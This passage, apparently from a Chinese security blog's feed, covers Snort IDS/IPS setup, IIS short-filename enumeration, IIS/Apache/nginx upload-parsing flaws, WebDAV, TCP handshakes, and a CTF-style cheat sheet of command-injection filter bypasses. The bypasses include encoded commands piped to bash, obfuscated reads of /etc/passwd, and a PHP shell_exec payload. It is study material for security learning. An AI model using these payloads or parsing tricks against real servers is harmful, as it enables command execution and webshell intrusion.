运行在不同的模式来决定是 IDS 还是 IPS。</p><ul><li><strong>IDS 模式</strong>：默认配置，Snort 只检测流量并生成警报，不会主动干预。</li><li><strong>IPS 模式</strong>：通过启用阻止功能，Snort 在检测到攻击时会采取动作（比如丢弃数据包或重置连接）。</li></ul><p><strong>2. 配置 Snort 在 IDS 模式</strong></p><p>如果你只希望 Snort 作为入侵检测系统运行（IDS），你可以确保以下配置项在 <code>snort.conf</code> 中设置为 <strong>警报模式</strong>：</p><p><code>#启用报警机制 output alert_fast: stdout</code></p><p>在这个配置中，Snort 将仅生成警报而不会采取任何防御措施。通过 <code>snort</code> 命令启动时，可以使用如下命令：</p><p><code>snort -c /etc/snort/snort.conf -A fast -i eth0</code></p><p><strong>3. 配置 Snort 在 IPS 模式</strong></p><p>要让 Snort 作为入侵防御系统（IPS）工作，必须启用 <strong>阻止数据包的功能</strong>。通常需要配置 <strong>inline</strong> 模式，这样 Snort 能够直接控制流量，并在检测到攻击时主动丢弃恶意流量。</p><p>在 <code>snort.conf</code> 中，你需要启用 <code>inline</code> 配置，并启用适当的 IPS 配置：</p><p><code># 设置 Snort 在 Inline 模式下运行 config policy_mode:inline</code></p><p>然后启动 Snort 时，使用以下命令：</p><p><code>snort -c /etc/snort/snort.conf -Q -i eth0</code></p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><h5 id="安装配置-snort-icmp-检测规则"><a href="#安装配置-snort-icmp-检测规则" class="headerlink" title="安装配置 snort  &amp; icmp 检测规则"></a>安装配置 snort  &amp; icmp 检测规则</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241209151605.png" alt="image.png"></p><p><strong>配置文件</strong><br>&#x2F;etc&#x2F;snort&#x2F;snort.lua </p><p>配置 ips<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241209152025.png" alt="image.png"></p><p><strong>规则文件</strong><br> 在 &#x2F;etc&#x2F;snort&#x2F;rules&#x2F; 目录下创建一个自定义规则文件（如 local.rules）：</p><p>在规则文件中添加以下规则内容(内置很多规则)  </p><p><strong>规则</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert icmp <span class="built_in">any</span> <span class="built_in">any</span> -&gt; $HOME_NET <span class="built_in">any</span> (msg:<span class="string">&quot;ICMP Ping Detected&quot;</span>; sid:<span class="number">1000001</span>; rev:<span class="number">1</span>;)</span><br></pre></td></tr></table></figure><ul><li><strong>alert</strong>: 指定规则的动作是触发报警。当匹配到该规则时，Snort 会生成一个警报。</li><li><strong>icmp</strong>: 这是协议字段，表示规则关注的是 ICMP 协议，通常用于 Ping 操作。</li><li><strong>any any</strong>: 这部分指定源地址和源端口。<code>any</code> 表示匹配任何源 IP 地址和端口。</li><li><strong>-&gt;</strong>: 表示流量的方向，从源到目的。</li><li><strong>$HOME_NET any</strong>: 目标地址和目标端口。<code>$HOME_NET</code> 是一个变量，通常定义为你内部网络的地址范围。<code>any</code> 表示匹配任何目标端口。</li><li><strong>(msg:”ICMP Ping Detected”; sid:1000001; rev:1;)</strong>: 规则选项部分：<ul><li><strong>msg</strong>: 指定规则触发时显示的消息。在本例中，如果规则匹配，消息将是“ICMP Ping Detected”。</li><li><strong>sid</strong>: 指定规则的唯一标识符（SID）。<code>sid:1000001</code> 表示这是规则的 ID，必须是唯一的，避免与其他规则冲突。</li><li><strong>rev</strong>: 规则的版本号，通常在规则修改时增加。</li></ul></li></ul><p>snort -c &#x2F;etc&#x2F;snort&#x2F;snort.lua  # 测试成功</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241209153326.png" alt="image.png"></p><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p>使用以下命令运行 Snort 并监控网络流量：</p><p>snort -c &#x2F;etc&#x2F;snort&#x2F;snort.lua -i eth0 -A fast -v</p><p>·  -c：指定配置文件。</p><p>·  -i：指定网络接口。</p><p>·  -A ：参数用于设置警报模式，fast表示输出简化的警报信息</p><p>·   -v：将以详细的方式输出每个捕获的数据包的信息<br>·  -l：指定日志保存路径。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241209160922.png" alt="image.png"></p><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241209161234.png" alt="image.png"></p><h4 id="联动防火墙"><a href="#联动防火墙" class="headerlink" title="联动防火墙"></a>联动防火墙</h4><p>大体思路就是 通过相关操作在规则中加上 exec 去执行shell脚本 ，脚本内容可以是防火墙封堵ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert icmp any any -&gt; $HOME_NET any (msg:&quot;ICMP Ping Detected&quot;; sid:1000001; exec:/etc/snort/iptables_block.sh; rev:1;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全设备 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全设备 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>短文件名枚举</title>
      <link href="/2024/11/30/%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%9E%9A%E4%B8%BE/"/>
      <url>/2024/11/30/%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%9E%9A%E4%B8%BE/</url>
      
        <content type="html"><![CDATA[<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。</p><p>在Windows下查看对应的短文件名，可以使用命令 dir &#x2F;x</p><p>主要还是因为 windows 的短文件名枚举<br>短文件名有以下特征：</p><p>1)   只有前六位字符直接显示，后续字符用~1指代。其中数字1还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）。</p><p>2)   后缀名最长只有3位，多余的被截断。</p><p>3)   访问构造的某个存在的短文件名，会返回404</p><p>4)   访问构造的某个不存在的短文件名，会返回400</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p><a href="http://www.xxx.com/abcde*~1*g**/a.aspx">http://www.xxx.com/abcde*~1*g**/a.aspx</a></p><p>逐渐猜测 不仅可以爆破目录还可以爆破 文件</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见服务器解析漏洞</title>
      <link href="/2024/11/30/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/11/30/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="lls-6-0"><a href="#lls-6-0" class="headerlink" title="lls 6.0"></a>lls 6.0</h4><h5 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 IIS5.x/6.0 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 /test.asp/1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了</span><br></pre></td></tr></table></figure><h5 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 IIS5.x/6.0 中,分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。</span><br></pre></td></tr></table></figure><h4 id="lls-7-0"><a href="#lls-7-0" class="headerlink" title="lls 7.0"></a>lls 7.0</h4><p> IIS7.0中，在默认Fast-CGI开启状况下test.jpg&#x2F;x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行.  </p><p>cgi.fix_pathinfo，该值默认为1，表示开启。当 php 遇到文件路径 &#x2F;aaa.xxx&#x2F;bbb.yyy&#x2F;ccc.zzz  时，若 &#x2F;aaa.xxx&#x2F;bbb.yyy&#x2F;ccc.zzz 不存在，则会去掉最后的 &#x2F;ccc.zzz ，然后判断 &#x2F;aaa.xxx&#x2F;bbb.yyy 是否存在，若存在，则把 &#x2F;aaa.xxx&#x2F;bbb.yyy 当做文件  &#x2F;aaa.xxx&#x2F;bbb.yyy&#x2F;ccc.zzz ，若   &#x2F;aaa.xxx&#x2F;bbb.yyy  仍不存在，则继续去掉  &#x2F;bbb.yyy  </p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h4><p>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p><h4 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a><strong>漏洞形式</strong></h4><p><a href="http://www.xxxx.xxx.com/test.php.xxx">www.xxxx.xxx.com/test.php.xxx</a></p><p><strong>配置问题导致漏洞</strong></p><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application&#x2F;x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>1、 由于nginx.conf的如下配置导致nginx把以’.php’结尾的文件交给fastcgi处理,为此可以构造<a href="http://ip/uploadfiles/test.png/.php">http://ip/uploadfiles/test.png/.php</a> </p><p>2、但是fastcgi在处理’.php’文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo&#x3D;1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了’&#x2F;test.png’。 最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将’.png’等文件当做代码解析。</p><p><strong>原理</strong></p><p>一般来讲，我们采用了 cgi 之后可以看到 它是逐层修复文件的，因为可以看到如果说他直接把php后缀的交给了服务器。但是最外层文件是不存在的，所以他会删掉，同时给出一个新的文件，但是可以看到我们的jpg是存在的就会解析我们的jpg作为php</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBDAv</title>
      <link href="/2024/11/30/WEBDAv/"/>
      <url>/2024/11/30/WEBDAv/</url>
      
        <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><strong>WebDAV</strong>（<strong>Web-based Distributed Authoring and Versioning</strong>）是一个基于 HTTP 协议的扩展，旨在使 Web 服务器能够支持远程文件的管理和协作编辑。它为 Web 服务提供了诸如文件管理、创建、删除、移动、修改等功能，类似于本地文件系统的操作方式，使得用户可以像操作本地文件一样，访问、编辑远程服务器上的文件。</p><h5 id="WebDAV-的关键特性："><a href="#WebDAV-的关键特性：" class="headerlink" title="WebDAV 的关键特性："></a>WebDAV 的关键特性：</h5><ol><li><p><strong>远程文件管理：</strong> WebDAV 允许用户远程操作文件，支持像复制、删除、移动文件或目录，甚至更复杂的操作（例如修改文件属性）。</p></li><li><p><strong>版本控制：</strong> WebDAV 可以与版本控制系统（如 Subversion、Git）结合使用，支持文件的版本管理和变更历史追踪。</p></li><li><p><strong>锁定机制：</strong> WebDAV 提供了“锁定”（Locking）机制，允许用户锁定文件，以防止在多人同时编辑文件时出现冲突。这种机制非常适用于多人协作编辑的环境，避免了版本冲突问题。</p></li><li><p><strong>多用户协作：</strong> WebDAV 使得多个用户可以在网络上共享、编辑文件，进行协同工作。</p></li><li><p><strong>跨平台支持：</strong> WebDAV 可以跨平台工作，许多操作系统（如 Windows、macOS、Linux）都内建了对 WebDAV 的支持。此外，也有许多 WebDAV 客户端应用程序和插件，可以在不同的设备和操作系统上访问 WebDAV 服务器。</p></li></ol><h5 id="WebDAV-的工作原理："><a href="#WebDAV-的工作原理：" class="headerlink" title="WebDAV 的工作原理："></a>WebDAV 的工作原理：</h5><p>WebDAV 基于 HTTP&#x2F;1.1 协议，通过扩展 HTTP 的方法来支持文件管理功能。它使用了标准的 HTTP 方法，同时也定义了一些新的方法：</p><ul><li><code>PROPFIND</code>：用于查询服务器上的资源的属性（例如获取文件列表或元数据）。</li><li><code>PROPPATCH</code>：用于修改资源的属性。</li><li><code>MKCOL</code>：用于创建一个新的目录。</li><li><code>COPY</code>：复制文件或目录。</li><li><code>MOVE</code>：移动文件或目录。</li><li><code>LOCK</code>：锁定资源，防止其他用户修改。</li><li><code>UNLOCK</code>：解除文件锁定。</li></ul><p>这些扩展的 HTTP 方法使得客户端可以在 Web 服务器上执行类似于文件系统操作的任务。</p><h5 id="WebDAV-的应用场景："><a href="#WebDAV-的应用场景：" class="headerlink" title="WebDAV 的应用场景："></a>WebDAV 的应用场景：</h5><ol><li><p><strong>远程文件存储和访问：</strong> WebDAV 可以作为一种远程文件存储解决方案，允许用户将文件存储在服务器上，并且能够通过 Web 浏览器或文件管理器直接访问这些文件。</p></li><li><p><strong>协作平台：</strong> 因为 WebDAV 支持多人同时访问和编辑文件，它被广泛应用于协作平台和共享工作空间。例如，很多企业使用 WebDAV 来实现远程团队之间的文件共享和编辑。</p></li><li><p><strong>备份和同步：</strong> WebDAV 也常用于备份和同步文件，用户可以通过 WebDAV 服务器远程备份文件，或者将文件同步到多个设备之间。</p></li></ol><h5 id="WebDAV-与其他文件共享协议的对比："><a href="#WebDAV-与其他文件共享协议的对比：" class="headerlink" title="WebDAV 与其他文件共享协议的对比："></a>WebDAV 与其他文件共享协议的对比：</h5><ol><li><p><strong>与 FTP&#x2F;FTPS 的对比：</strong> FTP 是一种古老的文件传输协议，虽然也能传输文件，但它没有像 WebDAV 那样的文件管理功能（如文件锁定、版本控制等）。此外，FTP 还比较依赖于客户端软件，而 WebDAV 可以直接通过 HTTP 协议在 Web 浏览器或操作系统中访问。</p></li><li><p><strong>与 SMB&#x2F;CIFS 的对比：</strong> SMB（Server Message Block）和 CIFS（Common Internet File System）协议主要用于局域网内的文件共享。与 WebDAV 不同，SMB 和 CIFS 更适合在本地网络环境下使用，WebDAV 更适用于通过互联网进行远程文件管理。</p></li><li><p><strong>与 NFS 的对比：</strong> NFS（Network File System）是一种用于 UNIX&#x2F;Linux 系统中的文件共享协议，通常需要配置专门的服务器和客户端。与 WebDAV 不同，NFS 不适用于直接通过 HTTP 访问文件，且它主要用于局域网内的共享，而 WebDAV 可以跨越网络进行访问，支持跨平台使用。</p></li></ol><h5 id="WebDAV-的安全性："><a href="#WebDAV-的安全性：" class="headerlink" title="WebDAV 的安全性："></a>WebDAV 的安全性：</h5><p>WebDAV 可以与 SSL&#x2F;TLS 配合使用（通常通过 <code>HTTPS</code> 协议），以确保文件传输过程中的数据加密和身份验证。这对于保护敏感数据在互联网上的传输至关重要。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcp握手</title>
      <link href="/2024/11/30/tcp%E6%8F%A1%E6%89%8B/"/>
      <url>/2024/11/30/tcp%E6%8F%A1%E6%89%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="https://xiaolincoding.com/network/3_tcp/quic.html#quic-%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E7%9A%84">https://xiaolincoding.com/network/3_tcp/quic.html#quic-%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E7%9A%84</a></p><h4 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h4><p>三次握手用于建立TCP连接，确保客户端和服务器之间能够可靠地通信。</p><ol><li><p><strong>第一次握手（SYN）</strong>：</p><ul><li>客户端发送一个SYN（同步）报文段到服务器，请求建立连接。</li><li>报文段中包含客户端的初始序列号（seq）。</li></ul></li><li><p><strong>第二次握手（SYN-ACK）</strong>：</p><ul><li>服务器收到SYN后，发送一个SYN-ACK报文段，确认接收到客户端的SYN。</li><li>这个报文段中包含服务器的初始序列号（seq）和客户端的序列号加1（ack），表示确认号。</li></ul></li><li><p><strong>第三次握手（ACK）</strong>：</p><ul><li>客户端收到SYN-ACK后，发送一个ACK报文段，确认收到服务器的SYN-ACK。</li><li>这个报文段的确认号为服务器的序列号加1（ack），同时客户端可以在此报文段中发送数据（可选）。</li></ul></li></ol><p>经过三次握手，客户端和服务器的连接建立成功。</p><h4 id="TCP四次挥手"><a href="#TCP四次挥手" class="headerlink" title="TCP四次挥手"></a>TCP四次挥手</h4><p>四次挥手用于终止TCP连接，确保双方能够正常关闭连接，避免数据丢失。</p><ol><li><p><strong>第一次挥手（FIN）</strong>：</p><ul><li>主动关闭连接的一方（比如客户端）发送一个FIN（结束）报文段，表示不再发送数据。</li><li>这个报文段中包含客户端的序列号（seq）。</li></ul></li><li><p><strong>第二次挥手（ACK）</strong>：</p><ul><li>另一方（服务器）收到FIN后，发送一个ACK报文段，确认收到FIN。</li><li>这个报文段的确认号为客户端的序列号加1（ack）。</li></ul></li><li><p><strong>第三次挥手（FIN）</strong>：</p><ul><li>服务器准备关闭连接后，发送一个FIN报文段，表示也不再发送数据。</li><li>这个报文段中包含服务器的序列号（seq）。</li></ul></li><li><p><strong>第四次挥手（ACK）</strong>：</p><ul><li>客户端收到服务器的FIN后，发送一个ACK报文段，确认收到服务器的FIN。</li><li>这个报文段的确认号为服务器的序列号加1（ack）。</li></ul></li></ol><h5 id="为什么要四次挥手"><a href="#为什么要四次挥手" class="headerlink" title="为什么要四次挥手"></a>为什么要四次挥手</h5><p>  防止服务端发送 fin的包丢失，导致客户端无法接收。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE绕过</title>
      <link href="/2024/11/30/RCE%E7%BB%95%E8%BF%87/"/>
      <url>/2024/11/30/RCE%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤:"></a>过滤:</h4><p>清理应用程序使用的用户输入是防止命令注入的好方法。这是指定用户可以提交的数据的格式或类型的过程。例如，仅接受数值数据或删除任何特殊字符（如 &gt; 和 &amp; &#x2F; ）的输入字段。<br>读取flag时候可以  不进行目录穿越  可以直接cat  &#x2F;f*   (*不能被禁止)</p><h4 id="Rce执行命令函数"><a href="#Rce执行命令函数" class="headerlink" title="Rce执行命令函数"></a>Rce执行命令函数</h4><p>var_dump 和echo 一样都可以打印字符。</p><ul><li>exec():执行外部程序</li><li>shell_exec():通过 shell 执行命令并将完整的输出以字符串的方式返回</li><li>system():执行外部程序，并且显示输出</li></ul><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241108142728.png" alt="image.png"></p><ul><li> popen() proc_open() pcntl_exec()</li><li>Echo <code>ls</code>  这种相当于执行命令</li><li>编码绕过</li><li>Creat_function 命令执行</li><li>$(command 或者脚本 ) 执行命令</li><li>scandir(&#x2F;);  列出目录</li></ul><h4 id="绕过注释"><a href="#绕过注释" class="headerlink" title="绕过注释"></a>绕过注释</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#cmd&quot;</span>.<span class="variable">$B</span>.<span class="string">&quot;inject&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?</span><span class="variable">$a</span>=<span class="title function_ invoke__">shell_exec</span>(%<span class="number">27</span>cat%<span class="number">20</span>/f*%<span class="number">27</span>);<span class="keyword">echo</span>%<span class="number">20</span><span class="variable">$a</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865#:~:text=%E6%80%BB%E7%BB%93rce%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%90%84%E7%A7%8Dsao%E5%A7%BF%E5%8A%BF%EF%BC%89%E7%BB%95%E8%BF%87bypass%201%20%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%EF%BC%9A%20%E5%9C%A8bash%E4%B8%8B%E5%8F%AF%E4%BB%A5%E7%94%A8%24IFS%E3%80%81%24%20%7BIFS%7D%E3%80%81%24IFS%249%E3%80%81%2509%E3%80%81%3C%E3%80%81%3E%E3%80%81%3C%3E%E3%80%81%20%7B%2C%7D%EF%BC%88%E4%BE%8B%E5%A6%82%20%7Bcat%2C%2Fetc%2Fpasswd%7D%20%EF%BC%89%E3%80%81%2520,cmd2%20%E5%8F%AA%E6%89%A7%E8%A1%8Ccmd2%20...%204%20%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%201%29%20%E5%88%A9%E7%94%A8%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87%20">总结rce（远程代码执行各种sao姿势）绕过bypass_rce绕过-CSDN博客</a></p><h4 id="linux常规命令绕过"><a href="#linux常规命令绕过" class="headerlink" title="linux常规命令绕过"></a>linux常规命令绕过</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241108143026.png" alt="image.png"></p><h4 id="一般有绕过就拼接"><a href="#一般有绕过就拼接" class="headerlink" title="- 一般有绕过就拼接"></a>- 一般有绕过就拼接</h4><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;***$a$b$c &#x2F;etc&#x2F;passwd</p><ul><li>但是有时候并不是过滤这个关键字而是 flag在尾部你还必须用tac</li></ul><h4 id="全部都被禁了怎么办-利用-反斜杠大用处"><a href="#全部都被禁了怎么办-利用-反斜杠大用处" class="headerlink" title="全部都被禁了怎么办 利用\ 反斜杠大用处"></a>全部都被禁了怎么办 利用\ 反斜杠大用处</h4><p>GET &#x2F;?rce&#x3D;c\at${IFS}fl\ag.php HTTP&#x2F;1.1</p><p>Host: node5.anna.nssctf.cn:28843</p><p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko&#x2F;20100101 Firefox&#x2F;120.0</p><p>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</p><p>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</p><p>Accept-Encoding: gzip, deflate</p><p>Connection: close</p><p>Upgrade-Insecure-Requests: 1</p><h4 id="利用编码绕过"><a href="#利用编码绕过" class="headerlink" title="-  利用编码绕过"></a>-  利用编码绕过</h4><p>echo ‘cat’ | base64</p><p>Y2F0wqAK</p><p><code>echo &#39;Y2F0wqAK&#39; | base64 -d</code> &#x2F;etc&#x2F;passwd</p><p>echo ‘Y2F0IC9ldGMvcGFzc3dk’ | base64 -d | bash&#x2F;&#x2F; cat &#x2F;etc&#x2F;passwd</p><ul><li><ol start="3"><li>利用hex编码（十六进制）绕过</li></ol></li></ul><p>echo “6c73” | xxd -r -p|bash&#x2F;&#x2F; hex编码后的0x不需要输入。</p><ul><li><ol start="4"><li>利用oct编码（八进制）绕过</li></ol></li></ul><p>$(printf “\154\163”)&#x2F;&#x2F;ls命令</p><p>$(echo “\154\163”)&#x2F;&#x2F;ls命令 都可以用八进制绕过</p><ul><li>5)利用16进制编码绕过</li></ul><p>“\x73\x79\x73\x74\x65\x6d”(“l\s”);</p><p>1.命令执行函数绕过  </p><p>PS:    在拼接<code>echo 的时候</code>    echo 后面打印的字符串可以不加单引号’’  </p><h4 id="利用-在参数传递的过程中如果有php语句可以写-POST-‘’"><a href="#利用-在参数传递的过程中如果有php语句可以写-POST-‘’" class="headerlink" title="利用 在参数传递的过程中如果有php语句可以写  $_POST[‘’];"></a>利用 在参数传递的过程中如果有php语句可以写  $_POST[‘’];</h4><p>可以直接在参数后面再加一个参数用来接收</p><h4 id="利用拼接绕过"><a href="#利用拼接绕过" class="headerlink" title="利用拼接绕过"></a>利用拼接绕过</h4><p>(sy.(st).em)(whoami);&#x2F;&#x2F;</p><p> c’’a’’t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;单引</p><p>c””a””t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;双引</p><p>c<code>a</code>t &#x2F;etc&#x2F;passwd&#x2F;反单引</p><p>c\a\t &#x2F;etc&#x2F;passwd&#x2F;&#x2F;反斜线</p><h4 id="和-，-x-x-代表-1-9-x-x-10-比如ca-21-t-a-txt表示cat-a-txt-在没有传入参数的情况下-这些特殊字符默认为空-如下"><a href="#和-，-x-x-代表-1-9-x-x-10-比如ca-21-t-a-txt表示cat-a-txt-在没有传入参数的情况下-这些特殊字符默认为空-如下" class="headerlink" title="$*和$@，$x(x 代表 1-9),${x}(x&gt;&#x3D;10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:"></a>$*和$@，$x(x 代表 1-9),${x}(x&gt;&#x3D;10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:</h4><p>wh$1oami</p><p>who$@ami</p><p>whoa$*mi</p><p>666<code>whoami</code>666 &#x2F;&#x2F;bash: 666root666: command not found</p><p>666<code>\whoami</code>666 &#x2F;&#x2F;bash: 666root666: command not found</p><p>&#x2F;&#x2F;命令执行后的结果在2个666中间</p><p>插入注释（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）</p><p>system&#x2F;<em>A10ng_</em>&#x2F;(whoami);</p><p>system&#x2F;<em>A10ng_</em>&#x2F;(wh.&#x2F;<em>A10ng_</em>&#x2F;(oa)&#x2F;<em>caixukun</em>&#x2F;.mi);</p><p>(sy.&#x2F;<em>A10ng_</em>&#x2F;(st)&#x2F;<em>A10ng_</em>&#x2F;.em)&#x2F;<em>A10ng_</em>&#x2F;(wh.&#x2F;<em>A10ng_</em>&#x2F;(oa)&#x2F;<em>A10ng_</em>&#x2F;.mi);</p><h4 id="利用未初始化变量"><a href="#利用未初始化变量" class="headerlink" title="利用未初始化变量"></a>利用未初始化变量</h4><p>cat$u &#x2F;etc&#x2F;passwd</p><ol start="7"><li>利用未初始化变量，使用$u绕过</li></ol><p>cat &#x2F;etc$u&#x2F;passwd</p><h4 id="过滤了斜杠‘-’"><a href="#过滤了斜杠‘-’" class="headerlink" title="过滤了斜杠‘&#x2F;’"></a>过滤了斜杠‘&#x2F;’</h4><p>可利用’;’拼接命令绕过</p><p>cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd</p><h4 id="利用通配符绕过："><a href="#利用通配符绕过：" class="headerlink" title="利用通配符绕过："></a>利用通配符绕过：</h4><p>列如cat &#x2F;passwd：</p><p>??? &#x2F;e??&#x2F;?a????</p><p>cat &#x2F;e*&#x2F;pa*</p><h4 id="glob通配符："><a href="#glob通配符：" class="headerlink" title="glob通配符："></a>glob通配符：</h4><p>在glob里</p><p>“ [A-Fa-f0-9] ”相当于 “ [ABCDEFabcdef0123456789] “.)</p><p>“ [-%] ”代表“ [!”#$%] ”而“ [az] ”代表“任何 小写字母”</p><p>利用[@-[]来表示大写字母：</p><p>[…]表示匹配方括号之中的任意一个字符</p><p>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</p><p>{…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开</p><p>cat t[a-z]st</p><p>cat t{a,b,c,d,e,f}st</p><p>利用PATH绕过</p><p>可以通过截断和拼接来得到我们想要的来getshell</p><p>${PATH:5:1} &#x2F;&#x2F;l</p><p>${PATH:2:1} &#x2F;&#x2F;s</p><p>${PATH:5:1}${PATH:2:1} &#x2F;&#x2F;拼接后是ls,执行命令</p><p>${PATH:5:1}s &#x2F;&#x2F;拼接后是ls,执行命令</p><h4 id="数学函数进制绕过"><a href="#数学函数进制绕过" class="headerlink" title="数学函数进制绕过"></a>数学函数进制绕过</h4><table><thead><tr><th>数学函数进制绕过</th><th><a 